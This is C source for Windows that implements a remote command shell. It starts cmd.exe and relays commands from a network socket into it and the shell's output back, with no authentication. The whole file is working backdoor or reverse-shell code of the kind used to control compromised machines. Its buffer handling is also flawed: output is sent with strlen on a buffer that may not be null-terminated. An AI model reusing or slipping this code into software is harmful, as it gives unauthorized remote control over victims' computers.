#include "includes.h"


int ScanOutPipe(HANDLE hStdoutRd, OVERLAPPED* readOverlapped, SOCKET sockt){
    DWORD bytesRead;
    char buf[2048];
    memset(&buf, 0, 2048);
    // MANUAL SIZE BUFFER KILL ME
    int c = ReadFile(hStdoutRd, buf, 2048,&bytesRead, readOverlapped);
    // WaitForSingleObjectEx(readOverlapped->hEvent, 500, TRUE);
    if (send(sockt, buf, strlen(buf), 0) < 0){
        perror("send in scanoutpipe died");
        return 1;
    }
    // WaitForSingleObjectEx(readOverlapped->hEvent, 500, TRUE);

    return 0;
}

int WriteInPipe(HANDLE hStdinWr, OVERLAPPED* writeOverlapped,  SOCKET sockt){
    DWORD bytesWritten;
    int len = 0;
    char input[1024] = {0};
    len = recv(sockt, (char*)&input, 1024, 0);
    // len <= 0 because when socket dies, recv return 0, rather than -1
    if (len <= 0){
        perror("recv in WriteInPipe died");
        return 1;
    }
    if (!WriteFile(hStdinWr, input, len, &bytesWritten, writeOverlapped)){
        perror("Writing to cmd died");
        return 1;
    }
    // WaitForSingleObject(writeOverlapped, 500);
    return 0;
}

int Shell(PROCESS_INFORMATION pi, SOCKET sock)
{
    int iResult;
    HANDLE hStdinRd, hStdinWr, hStdoutRd, hStdoutWr;
    SECURITY_ATTRIBUTES sa = { sizeof(SECURITY_ATTRIBUTES), NULL, TRUE };
    // Create pipes for the child process's standard input and output.
    if (!CreatePipe(&hStdoutRd, &hStdoutWr, &sa, 0) ||
        !CreatePipe(&hStdinRd, &hStdinWr, &sa, 0))
    {
        perror("failed at creating pipes for child process");
        return -1;
    }
    sa.bInheritHandle = TRUE;
    STARTUPINFO si = { sizeof(STARTUPINFO) };
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdInput = hStdinRd;
    si.hStdOutput = hStdoutWr;
    si.hStdError = hStdoutWr;
    OVERLAPPED writeOverlapped = { 0 };
    OVERLAPPED readOverlapped = { 0 };
    writeOverlapped.hEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
    readOverlapped.hEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
    if (!CreateProcess(NULL, "C:\\Windows\\System32\\cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi))
    {
        perror("failed at creating process");
        closesocket(sock);
        return -2;
    }
    CloseHandle(hStdoutWr);
    CloseHandle(hStdinRd);
    /* INITIAL CMD LOADING*/
    ScanOutPipe(hStdoutRd, &readOverlapped, sock);
    ScanOutPipe(hStdoutRd, &readOverlapped, sock);
    /*END OF LOADING*/
    while (1){
        iResult = WriteInPipe(hStdinWr, &writeOverlapped ,sock);
        if (iResult){
            break;
        }
        iResult = ScanOutPipe(hStdoutRd, &readOverlapped, sock);
        if(iResult){
            break;
        }
    }
    CloseHandle(hStdoutRd);
    CloseHandle(hStdinWr);
    TerminateProcess(pi.hProcess, 0);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    return 0;
}
